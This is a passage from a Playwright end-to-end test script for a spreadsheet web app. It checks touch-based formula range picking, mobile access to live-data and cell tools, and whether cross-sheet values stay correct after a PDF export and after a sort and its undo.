      const cdp = await page.context().newCDPSession(page);
      const touch = (type, x, y) => cdp.send("Input.dispatchTouchEvent", { type, touchPoints: type === "touchEnd" ? [] : [{ x, y }] });
      const x = grip.x + grip.width / 2;
      const y = grip.y + grip.height / 2;
      const endY = to.y + to.height / 2;
      await touch("touchStart", x, y);
      for (let i = 1; i <= 10; i++) {
        await touch("touchMove", x, y + ((endY - y) * i) / 10);
        await page.waitForTimeout(16);
      }
      await touch("touchEnd", x, endY);
      await page.waitForTimeout(150);
      note((await editor.inputValue()) === "=SUM(B3:B4", `the pointed cell's grip widens it into a range (${await editor.inputValue()})`);
      const shown = await page.getByPlaceholder(/SUM\(A1:A10\)/).inputValue();
      note(shown === "=SUM(B3:B4", `the formula bar shows the formula as it is typed (${shown})`);
      const focused = await page.evaluate(() => document.activeElement?.tagName);
      note(focused === "INPUT", `the editor kept focus through taps and the drag, so the keyboard stays up (${focused})`);

      await bar.getByRole("button", { name: label.pointingDone }).tap();
      await page.waitForTimeout(150);
      const raw = await page.getByPlaceholder(/SUM\(A1:A10\)/).inputValue();
      note(raw === "=SUM(B3:B4)", `Done saves the formula with its bracket closed (${raw})`);
      note((await cell(page, 4, 1).innerText()).trim() === "50", `and B5 shows 50`);

      // ⌖ on a phone: the form folds into a bar and the grid above it can be tapped.
      await tapCell(5, 1);
      note(!(await bar.isVisible()), "and the pointing bar goes with the editor");
      await page.getByRole("button", { name: label.formulas }).last().tap();
      await page.locator('[role="button"][aria-label^="SUM"]').first().tap();
      await page.getByRole("button", { name: label.pickRange }).tap();
      const picking = page.getByRole("region", { name: label.pickRange });
      await picking.waitFor({ timeout: 5000 });
      note(!(await page.locator("aside").isVisible()), "⌖ folds the form away so the grid can be tapped");
      await tapCell(1, 1);
      const chip = (await picking.locator("[aria-live]").innerText()).trim();
      note(chip === "B2", `a tap on the grid is picked into the field (${chip})`);
      await picking.getByRole("button", { name: /^(ใช้|Use) / }).tap();
      const field = await page.locator("aside input").first().inputValue();
      note(field === "B2", `Use opens the form again with the pick in it (${field})`);
      await page.keyboard.press("Escape");
    },
  },
  {
    // The report this came from: on a phone, the person who wrote the app could not find where to
    // connect an API. The panel switches were a scrolling row of unnamed icons, and the rest of the
    // row was past the edge. A unit test cannot see a layout, so this is the one place that asks
    // whether the way there is on screen and says what it is.
    name: "on a phone, the way to live data is on screen and named, and cell tools are one press away",
    width: 390,
    async run(page) {
      const tab = page.getByRole("button", { name: label.liveData });
      note(await tab.isVisible(), "a tab named live data is on screen at 390px without scrolling");

      await page.getByRole("button", { name: label.menu }).click();
      const menu = page.getByRole("dialog", { name: label.menu });
      await menu.waitFor({ timeout: 5000 });
      await menu.getByRole("button", { name: label.connectApi }).click();
      await page.locator("aside h2", { hasText: /ข้อมูลสด|Live data/ }).waitFor({ timeout: 5000 });
      note(!(await menu.isVisible()), "the menu's connect line opens the live-data panel and gets out of the way");
      await tab.click();

      // Italic sits in the row itself, not the sheet: it is one of the five pressed every few minutes.
      await cell(page, 1, 0).click();
      await page.getByRole("button", { name: label.italic }).click();
      const style = await cell(page, 1, 0).evaluate((td) => getComputedStyle(td.querySelector("span") ?? td).fontStyle);
      note(style === "italic", `the italic button sets the cell in italic (font-style "${style}")`);

      await page.getByRole("button", { name: label.tools }).click();
      const sheet = page.getByRole("dialog", { name: label.cellTools });
      await sheet.waitFor({ timeout: 5000 });
      await sheet.getByRole("button", { name: label.chart }).click();
      await page.locator("aside").first().waitFor({ state: "visible", timeout: 5000 });
      note(!(await sheet.isVisible()), "a tool pressed in the sheet does its job and the sheet closes behind it");
    },
  },
  {
    // #95: the screen itself went wrong. An export or a sort computed a sheet without the rest of
    // the workbook, the cache kept that `#REF!`, and a few tabs later the grid was handed it back.
    // Six sheets, because it takes four other sheets computed to push a result out of the history,
    // and one of the five others (Sheet1) is only ever read through the cache.
    name: "cross-sheet values stay right on screen after a PDF export, and after a sort and its undo (#95, #58)",
    // Wide enough for the PDF button to sit on the toolbar; below 1366px it lives in the menu (#117).
    width: 1440,
    async run(page) {
      const tab = (name) => page.locator("span.cursor-pointer.select-none").filter({ hasText: new RegExp(`^${name}$`) });
      const shown = async (r, c) => (await cell(page, r, c).innerText()).trim();
      await typeInCell(page, 0, 0, "42");
      await typeInCell(page, 1, 0, "10");
      for (let n = 2; n <= 6; n++) {
        await page.getByTitle(label.addSheet).click();
        await tab(`Sheet${n}`).waitFor();
        await typeInCell(page, 0, 0, `=Sheet1!A1*${n}`);
      }
      // Sheet6: three rows to sort, two of them read Sheet1.
      await typeInCell(page, 0, 0, "=Sheet1!A1*2");
      await typeInCell(page, 1, 0, "=Sheet1!A2*3");
      await typeInCell(page, 2, 0, "5");
      const before = [await shown(0, 0), await shown(1, 0), await shown(2, 0)];
      note(before.join(",") === "84,30,5", `the summary sheet shows its cross-sheet values (${before})`);

      const [pdf] = await Promise.all([page.waitForEvent("download"), page.getByRole("button", { name: label.exportPdf }).click()]);
      await pdf.path();
      for (const name of ["Sheet2", "Sheet3", "Sheet4", "Sheet5", "Sheet1", "Sheet6"]) {
        await tab(name).click();
        await page.waitForTimeout(150);
      }
      const afterPdf = [await shown(0, 0), await shown(1, 0), await shown(2, 0)];
      note(afterPdf.join(",") === "84,30,5", `after the PDF export and a walk through the tabs, the same values (${afterPdf})`);

      await cell(page, 0, 0).click();
      await page.getByTitle(label.sortAsc).click();
      const sorted = [await shown(0, 0), await shown(1, 0), await shown(2, 0)];
      note(sorted.join(",") === "5,30,84", `a sort orders them by their numbers (${sorted})`);
      await page.keyboard.press("Control+z");
      for (const name of ["Sheet2", "Sheet3", "Sheet4", "Sheet5", "Sheet1", "Sheet6"]) {
        await tab(name).click();
        await page.waitForTimeout(150);
      }
      const undone = [await shown(0, 0), await shown(1, 0), await shown(2, 0)];
      note(undone.join(",") === "84,30,5", `and its undo brings them back, still numbers (${undone})`);
    },
  },
];

const tmp = await mkdtemp(join(tmpdir(), "exceltogo-e2e-"));
const server = spawn("node", ["node_modules/next/dist/bin/next", "start", "-p", String(PORT)], {
  stdio: ["ignore", "pipe", "pipe"],
  env: { ...process.env, NODE_ENV: "production" },
});
let serverLog = "";
server.stdout.on("data", (d) => (serverLog += d));
server.stderr.on("data", (d) => (serverLog += d));

let browser;
try {
  await waitForServer().catch((err) => {
    console.error(serverLog);
    throw err;
  });

  browser = await chromium.launch({
    // Set CHROME_PATH where Playwright's own download isn't the browser to use; CI installs one
    // and leaves this unset.
    executablePath: process.env.CHROME_PATH || undefined,
    // A UTF-8 locale, or a Thai file name downloads as "download" (see browserEnv.mjs).
    env: browserEnv(),
  });

  for (const flow of only ? FLOWS.filter((f) => f.name.includes(only)) : FLOWS) {
    console.log(`\n${flow.name}`);
    const { ctx, page } = await freshPage(browser, flow.width, flow.touch);
    const errors = [];
    page.on("pageerror", (err) => errors.push(String(err).split("\n")[0]));
    try {
      await flow.run(page, { tmp });
    } catch (err) {
      // A flow that cannot run is a failure, not a skip — the same rule the a11y gate learned.
      note(false, `${flow.name}: threw`, String(err.message).split("\n")[0]);
    }
    // A flow can pass every assertion while the console fills with exceptions React swallowed.
    note(errors.length === 0, `no uncaught page errors during: ${flow.name}`, errors.join(" · "));
    await ctx.close();
  }
} finally {
  await browser?.close();
  stubApi.close();
  server.kill("SIGTERM");
  await rm(tmp, { recursive: true, force: true });
}

if (failures.length > 0) {
  console.error(`\ncheck:e2e — ${failures.length} check(s) failed`);
  process.exit(1);
}
console.log(only ? `\ncheck:e2e — flows matching "${only}" passed` : `\ncheck:e2e — ${FLOWS.length} flows passed`);
